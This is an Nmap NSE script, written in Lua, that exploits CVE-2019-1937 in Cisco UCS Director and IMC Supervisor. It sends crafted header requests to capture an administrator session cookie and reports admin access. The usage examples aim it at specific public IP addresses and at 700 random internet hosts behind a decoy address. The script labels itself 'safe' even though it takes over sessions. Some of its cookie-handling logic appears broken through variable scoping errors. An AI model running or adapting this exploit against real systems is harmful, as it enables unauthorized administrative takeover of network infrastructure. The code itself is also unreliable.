---
-- Nmap NSE cisco-cve-2019-1937.nse - Version 1.9
-- Affected versions: Cisco UCS Director 6.6.0 <=> 6.7.0
-- Copy to: /usr/share/nmap/scripts/cisco-cve-2019-1937.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help cisco-cve-2019-1937.nse
-- Port(s) accepted by this nse: 80,443
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it {Disclosure = Pedro Ribeiro}
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.

Some Syntax examples:
nmap --script-help cisco-cve-2019-1937.nse
nmap -sV -T4 -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse 212.40.68.127
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 212.40.68.127
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "uri=/,verbose=true" 137.44.25.194
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "lhost=192.168.1.71,verbose=true" 149.96.17.235
nmap -sS -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3" 137.44.25.194
nmap -sS -Pn -n -v -T4 -iR 700 -p 80,443 --open --reason --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help cisco-cve-2019-1937.nse
-- nmap -sV -T4 -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse 212.40.68.127
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 212.40.68.127
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "uri=/,verbose=true" 137.44.25.194
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "lhost=192.168.1.71,verbose=true" 149.96.17.235
-- nmap -sS -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3" 137.44.25.194
-- nmap -sS -Pn -n -v -T4 -iR 700 -p 80,443 --open --reason --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 443/tcp open  https  Apache httpd 2.4.38
-- | cisco-cve-2019-1937:
-- |   VULNERABLE:
-- |   Cisco UCS Supervisor (Web Interface Auth Bypass)
-- |   State: VULNERABLE
-- |   IDs:  CVE:CVE-2019-1937
-- |   Risk factor: Critical  CVSSv2: 10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
-- |     Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
-- |     to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
-- |     is due to insufficient request header validation during the authentication process. An attacker could exploit this
-- |     vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
-- |     to use the acquired session token to gain full administrator access to the affected device.
-- |
-- |   Disclosure date: 2019-Ago-21
-- |   Exploit results:
-- |     Uri: https://192.168.1.71:443/app/ui/ClientServlet?apiName=GetUserInfo
-- |     Auth-Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
-- |     LoginAccess: admin
-- |
-- |   Referencies:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-1937
-- |     https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby
-- |     https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html
-- |_
-- @args verbose => Display Error(s) verbose outputs  - Default: false
-- @args User-Agent => User-Agent to send in requests - Default: Android; Mobile; Firefox 45.0
-- @args uri => the Full URL to send in GET requests  - Default: /app/ui/ClientServlet?apiName=GetUserInfo
--
-- @args lhost => Manually set internal ip addr       - Default: nil (auto-seach)
-- IF for any reason my nse cant 'auto' (nil) retrieve the lhost internal ip addr.
-- Then the nse 'User' can manually input is internal ip address using script @args lhost=<internal-ip-addr>
-- Example: nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "lhost=192.168.1.71" <target-ip-addr>
---


author = "r00t-3xp10it"
copyright = "Pedro Ribeiro"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse" --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 443}, "http, https", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local decoy_agent = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/45.0"
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/app/ui/ClientServlet?apiName=GetUserInfo"
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local ip_addr = stdnse.get_script_args(SCRIPT_NAME..".lhost") or nil
local uri_stats,cookie_stats,vuln_test = nil,nil,nil


if ( ip_addr == nil ) then
-- Capture (Local) distro flavor { windows | Linux }
local socket = io.popen("ver 2>&1") --> supress io.popen() stdout error msg (2>&1)
flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
socket.close()
if ( flavor == nil or flavor == "" or string.find(flavor, "not found")) then
   local socket = io.popen("uname -s")
   flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
   socket.close()
end

   if (string.find(flavor, "[Ll]inux")) then
      -- Executing BASH command(s) and storing results
      -- Storing network interface in use { wlan0 | eth0 }
      local socket = io.popen("netstat -r|grep 'default'|awk {'print $8'}")
      local int_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from interface
      socket:close()
      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ifconfig "..int_addr.."|grep -m 1 'inet'|awk {'print $2'}")
      ip_addr = socket:read("*a"):gsub("\n", ""):gsub(" ", "") --> Strip 'new line' from ip addr
      socket:close()
   elseif (string.find(flavor, "[Ww]indows")) then
      -- Executing CMD command and storing results
      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ipconfig|FINDSTR IPv4")
      ip_addr = socket:read("*a"):gsub("[Aa]utoconfiguration IPv4 [Aa]ddress. . : ", ""):gsub("\n", ""):gsub(" ", "")
      socket.close()
   else
      -- This nse script its written to execute ONLY in (Local) Windows or Linux Operative Systems
      print("| cve-2019-1937:\n|   State: not compatible flavor: "..flavor.."\n|    Remark: This nse only exec under Windows or Linux\n|_")
      return nil
   end
end

-- Make sure we have the 'ip_addr' local variable set by now. { auto | manual }
-- string.match(ip_addr, '%a+') will try to match any chars/words in ip_addr variable
-- and automatic aborts nse execution { bad response: ipv4 addr does not contain characters }
if (string.match(ip_addr, '%a+') or ip_addr == nil or ip_addr == "") then
   print("| cve-2019-1937:\n|   State: nse cant retrieve internal ip addr\n|    Input ip addr: --script-args lhost=192.168.1.71,verbose=true\n|_")
   return nil --> abort further tests.
end


-- Identify servers that answer 200 to invalid HTTP requests
-- and exit as these would invalidate the next nse tests
local status_404, result_404, _ = http.identify_404(host, port)
if ( status_404 and result_404 == 200 ) then
   print("| cve-2019-1937:\n|   Uri: http://"..host.ip..":"..port.number.." (false positive)\n|    Reason: All URIs tested return status [200] OK\n|_")
   return nil
end


-- Send [1º] GET request - to capture redirection = header['Location']
-- redirection local variable its then parsed to extract the redirection url,
-- and rewrites uri local variable with the redirection url { 2º GET request }
if ( not(ip_addr == nil or ip_addr == "") ) then
local _decoy = {header={}} --> Build TCP request 'header'
_decoy['header']['Host'] = ip_addr
_decoy['header']['User-Agent'] = decoy_agent
_decoy['header']['Cache-Control'] = "no-store"
_decoy['header']['X-Requested-With'] = "XMLHttpRequest"
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
if ( port.number == 80 ) then _decoy['header']['Referer'] = "http://"..ip_addr.."/" end
if ( port.number == 443 ) then _decoy['header']['Referer'] = "https://"..ip_addr.."/" end

   -- Send [1º] GET request and read response
   local response = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(response or response.status) ) then
      uri_stats = "uri not found"
   elseif (response and response.status == 404) then
      uri_stats = "uri not found"
   elseif (response and response.status == 302) then
      -- if [302] then Grab redirection url to use on next GET request
      local redirection = response.header and response.header['Location'] or ""
      if ( not(redirection == nil or redirection == "") ) then
         if (port.number == 443) then
            -- extract only the url from header['Location'] { strip extra chars }
            uri = redirection:gsub("[Ll]ocation: https://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         else
            -- extract only the url from header['Location'] { strip extra chars }
            uri = redirection:gsub("[Ll]ocation: http://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         end
      else
         -- None redirection header['Location'] found
         uri_stats = "none header redirection"
      end
   end
end


-- Send [2º] GET request - Follow the redirection uri to capture Set-Cookie { auth cookie }
-- we are now sending a GET request using the redirection url { rewrited uri } captured in last request.
-- Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC745; Path=/app; Secure; HttpOnly
if ( uri_stats == "true" ) then
   local res = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(res or res.status) ) then
      cookie_stats = "redirection uri not found"
   elseif (res and res.status ~= 200) then
      -- Wrong uri status code received (not vulnerable)
      cookie_stats = "redirection uri not found"
   elseif (res and res.status == 200) then
      -- if [200] then Grab Set-Cookie value to use on next GET request.
      local set_cookie = response.header and response.header['Set-Cookie'] or ""
      if ( not(set_cookie == nil or set_cookie == "") ) then
         -- extract only the cookie value from header['Set-Cookie'] { strip extra chars }
         local parse_cookie = set_cookie:gsub("[Ss]et-[Cc]ookie: ", ""):gsub("; [Pp]ath=/app; [Ss]ecure; [Hh]ttp[Oo]nly", "")
         cookie_stats = "true"
      else
         cookie_stats = "none cookie"
      end
   end
end


-- Build Nmap vulnerable {table}
local vuln_table = {
   title = "Cisco UCS Supervisor (Web Interface Auth Bypass)",
   state = vulns.STATE.NOT_VULN,
   IDS = {CVE = 'CVE-2019-1937'},
   risk_factor = "Critical",
      scores = {
         CVSSv2 = "10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
      },
   description = [[
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.
]],
   references = {
     'https://nvd.nist.gov/vuln/detail/CVE-2019-1937',
     'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby',
     'https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html',
   },
   dates = {
      disclosure = {year = '2019', month = 'Ago', day = '21'},
   },
   exploit_results = {}, --> Display auth cookie and creds
}

-- Build vulnerable stdout { vuln_table }
if (uri_stats == "true" and cookie_stats == "true") then
   if (port.number == 443) then table.insert(vuln_table.exploit_results, string.format("Uri: https://"..host.ip..":"..port.number..uri)) end
   if (port.number == 80) then table.insert(vuln_table.exploit_results, string.format("Uri: http://"..host.ip..":"..port.number..uri)) end
   table.insert(vuln_table.exploit_results, string.format("Auth-Cookie: "..parse_cookie))
   table.insert(vuln_table.exploit_results, string.format("LoginAccess: admin\n"))
end


-- Send [3º] GET request - admin session cookie Authentication
if (uri_stats == "true" and cookie_stats == "true") then
uri = "/app/ui/ClientServlet?apiName=GetUserInfo"
local _send = {header={}} --> Build TCP request 'header'
_send['header']['Host'] = ip_addr
_send['header']['User-Agent'] = decoy_agent
_send['header']['Cookie'] = parse_cookie..";"
_send['header']['Cache-Control'] = "no-store"
_send['header']['X-Requested-With'] = "XMLHttpRequest"
_send['header']['X-Starship-UserSession-Key'] = "ssa"
_send['header']['X-Starship-Request-Key'] = "redteam"
_send['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
if ( port.number == 80 ) then _send['header']['Referer'] = "http://"..ip_addr.."/" end
if ( port.number == 443 ) then _send['header']['Referer'] = "https://"..ip_addr.."/" end

   -- Send [3º] GET request and read response
   local vuln_test = http.get(host, port, uri, _send, { no_cache = true, no_cache_body = true })
   if (vuln_test and vuln_test.status == 200) then
      vuln_table.state = vulns.STATE.VULN
      local report = vulns.Report:new(SCRIPT_NAME, host, port)
      return report:make_output(vuln_table)
   elseif (vuln_test and vuln_test.status ~= 200) then
      -- Delete the last char from [Referer] to build display
      local parse_ref = _send['header']['Referer']:sub(1, -2)
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: [?] POSSIBLE VULNERABLE to CVE-2019-1937\n    Remark: Host did NOT accepted our header[cookie] authentication\n    Uri: "..parse_ref..":"..port.number..uri.."\n\n"
   end

   -- Error messages { verbose=true }
   elseif (uri_stats == "uri not found" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [001] uri not found\n\n"
   elseif (uri_stats == "none header redirection" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [002] header['Location'] not found\n\n"
   elseif (cookie_stats == "redirection uri not found" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [003] redirection uri not found\n\n"
   elseif (cookie_stats == "none cookie" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [004] auth cookie not found\n\n"
   end
end
